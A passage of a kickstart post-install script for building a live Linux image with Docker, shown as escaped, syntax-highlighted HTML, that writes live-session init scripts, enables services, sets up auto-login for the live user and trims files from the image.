http://bugs.centos.org/view.php?id=7217\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/usr/bin/cp /usr/lib/python2.7/site-packages/blivet/size.py /usr/lib/python2.7/site-packages/blivet/size.py.orig\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/usr/bin/sed -i \u0026#34;s#return self.humanReadable()#return self.humanReadable().encode(\u0026#39;utf-8\u0026#39;)#g\u0026#34; /usr/lib/python2.7/site-packages/blivet/size.py\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# bah, hal starts way too late\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat \u0026gt; /etc/rc.d/init.d/livesys-late \u0026lt;\u0026lt; EOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# live: Late init script for live image\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# chkconfig: 345 99 01\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# description: Late init script for live image.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e. /etc/init.d/functions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif ! strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; rd.live.image || [ \u0026#34;\\$1\u0026#34; !\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;start\u0026#34; ] || [ -e /.liveimg-late-configured ] ; then\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    exit 0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eexists() {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ewhich \\$1 \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 || return\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\\$*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003etouch /.liveimg-late-configured\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# read some variables out of /proc/cmdline\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efor o in \\`cat /proc/cmdline\\` ; do\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ecase \\$o in\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eks\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e*)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        ks=\u0026#34;--kickstart=\\${o#ks=}\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    xdriver=*)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        xdriver=\u0026#34;\\${o#xdriver=}\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    esac\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# if liveinst or textinst is given, start anaconda\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; liveinst ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"na\"\u003eplymouth --quit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"na\"\u003e/usr/sbin/liveinst \\$ks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif strstr \u0026#34;\\`cat /proc/cmdline\\`\u0026#34; textinst ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"na\"\u003eplymouth --quit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"na\"\u003e/usr/sbin/liveinst --text \\$ks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# configure X, allowing user to override xdriver\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -n \u0026#34;\\$xdriver\u0026#34; ]; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \u003cspan class=\"na\"\u003ecat \u0026gt; /etc/X11/xorg.conf.d/00-xdriver.conf \u0026lt;\u0026lt;FOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eSection \u0026#34;Device\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eIdentifier      \u0026#34;Videocard0\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eDriver  \u0026#34;\\$xdriver\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEndSection\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod 755 /etc/rc.d/init.d/livesys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/sbin/restorecon /etc/rc.d/init.d/livesys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/sbin/chkconfig --add livesys\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod 755 /etc/rc.d/init.d/livesys-late\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/sbin/restorecon /etc/rc.d/init.d/livesys-late\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/sbin/chkconfig --add livesys-late\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# enable tmpfs for /tmp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl enable tmp.mount\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# enable docker\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003esystemctl enable docker.service\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# work around for poor key import UI in PackageKit\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erm -f /var/lib/rpm/__db*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ereleasever\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e$(rpm -q --qf \u0026#39;%{version}\\n\u0026#39; --whatprovides system-release)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebasearch\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e$(uname -i)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-$releasever-$basearch\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eecho \u0026#34;Packages within this LiveCD\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erpm -qa\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Note that running rpm recreates the rpm db files which aren\u0026#39;t needed or wanted\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erm -f /var/lib/rpm/__db*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# go ahead and pre-make the man -k cache (#455968)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e/usr/bin/mandb\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# save a little bit of space at least...\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erm -f /boot/initramfs*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# make sure there aren\u0026#39;t core files lying around\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erm -f /core*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# convince readahead not to collect\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# FIXME: for systemd\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat \u0026gt;\u0026gt; /etc/rc.d/init.d/livesys \u0026lt;\u0026lt; EOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# disable updates plugin\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat \u0026gt;\u0026gt; /usr/share/glib-2.0/schemas/org.gnome.settings-daemon.plugins.updates.gschema.override \u0026lt;\u0026lt; FOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[org.gnome.settings-daemon.plugins.updates]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eactive\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003efalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Show the system-config-keyboard tool on the desktop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003emkdir /home/liveuser/Desktop -p \u0026gt;/dev/null\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat /usr/share/applications/system-config-keyboard.desktop | sed \u0026#39;/NotShowIn/d\u0026#39; |sed \u0026#39;s/Terminal\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003efalse/Terminal=true/\u0026#39; \u0026gt; /home/liveuser/Desktop/system-config-keyboard.desktop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat /usr/share/applications/liveinst.desktop | sed \u0026#39;/NoDisplay/d\u0026#39; \u0026gt; /home/liveuser/Desktop/liveinst.desktop \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echmod +x /home/liveuser/Desktop/*.desktop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echown -R liveuser:liveuser /home/liveuser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Liveuser face\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -e /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png ] ; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003ecp /usr/share/icons/hicolor/96x96/apps/fedora-logo-icon.png /home/liveuser/.face\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003echown liveuser:liveuser /home/liveuser/.face\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# make the installer show up\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -f /usr/share/applications/liveinst.desktop ]; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e# Show harddisk install in shell dash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003esed -i -e \u0026#39;s/NoDisplay\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003etrue/NoDisplay=false/\u0026#39; /usr/share/applications/liveinst.desktop \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  # need to move it to anaconda.desktop to make shell happy\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  #cp /usr/share/applications/liveinst.desktop /usr/share/applications/anaconda.desktop\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003ecat \u0026gt;\u0026gt; /usr/share/glib-2.0/schemas/org.gnome.shell.gschema.override \u0026lt;\u0026lt; FOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[org.gnome.shell]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efavorite-apps\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e[\u0026#39;liveinst.desktop\u0026#39;,\u0026#39;firefox.desktop\u0026#39;, \u0026#39;evolution.desktop\u0026#39;, \u0026#39;empathy.desktop\u0026#39;, \u0026#39;rhythmbox.desktop\u0026#39;, \u0026#39;shotwell.desktop\u0026#39;, \u0026#39;libreoffice-writer.desktop\u0026#39;, \u0026#39;nautilus.desktop\u0026#39;, \u0026#39;gnome-documents.desktop\u0026#39;, \u0026#39;anaconda.desktop\u0026#39;]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# set up auto-login\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ecat \u0026gt; /etc/gdm/custom.conf \u0026lt;\u0026lt; FOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[daemon]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eAutomaticLoginEnable\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eTrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eAutomaticLogin\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003eliveuser\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFOE\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Turn off PackageKit-command-not-found while uninstalled\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eif [ -f /etc/PackageKit/CommandNotFound.conf ]; then\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003esed -i -e \u0026#39;s/^SoftwareSourceSearch\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003etrue/SoftwareSourceSearch=false/\u0026#39; /etc/PackageKit/CommandNotFound.conf\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# make sure to set the right permissions and selinux contexts\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003echown -R liveuser:liveuser /home/liveuser/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003erestorecon -R /home/liveuser/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 